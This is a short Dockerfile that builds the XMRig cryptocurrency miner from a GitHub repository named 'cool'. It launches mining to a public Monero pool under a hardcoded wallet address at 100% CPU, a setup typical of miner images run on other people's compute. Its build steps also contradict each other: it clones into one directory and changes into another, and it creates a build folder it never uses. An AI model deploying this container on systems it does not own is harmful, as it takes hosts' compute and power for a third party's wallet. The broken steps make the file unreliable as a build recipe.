FROM  alpine:latest
RUN   adduser -S -D -H -h /xmrig miner
RUN   apk --no-cache upgrade && \
      apk --no-cache add \
        git \
        cmake \
        libuv-dev \
        build-base && \
      git clone https://github.com/wizkid220/cool && \
      cd xmrig && \
      mkdir build && \
      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \
      make && \
      apk del \
        build-base \
        cmake \
        git
USER miner
WORKDIR    /xmrig
ENTRYPOINT  ["./xmrig", "-o", "pool.supportxmr.com:3333", "-u", "41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.d", "-p", "x", "-k", "--donate-level", "1", "--max-cpu-usage", "100"]
